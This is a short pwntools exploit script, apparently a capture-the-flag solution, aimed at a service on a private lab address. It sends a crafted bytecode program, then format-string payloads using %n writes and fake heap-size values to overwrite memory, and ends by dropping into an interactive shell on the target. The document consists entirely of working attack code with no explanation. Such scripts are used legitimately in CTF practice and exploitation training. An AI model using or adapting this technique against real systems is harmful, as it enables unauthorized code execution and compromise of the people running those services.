#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import time
host = "10.211.55.6"
port = 8888

r = remote(host,port)

prog = "\x91\x31"
arg = 0xdeadbeef
r.recvuntil("program?:")
r.sendline(str(len(prog)))
r.recvuntil("program:")
r.send(prog)
r.recvuntil(":")
r.send(str(arg))
r.recvuntil("!")

r.send("a"*0x3f)
time.sleep(0.6)
payload =  "%6316117c%8$norange"
r.send("a"*0x9 + p64(0x0000000000020701) + "bbb" + payload)

time.sleep(0.4)
r.send("a")
time.sleep(0.2)
r.send("aa")
r.recvuntil("orange",timeout=3)
r.send("a"*0x3f)


time.sleep(0.4)
payload = "%4197005c%14$lnnogg"
r.send("a"*0x9 + p64(0x0000000000020691) + "bbb" + payload)
time.sleep(0.1)
r.send("a")
time.sleep(0.2)
r.send("aa")
r.recvuntil("nogg",timeout=3)
raw_input("win?")
r.interactive()
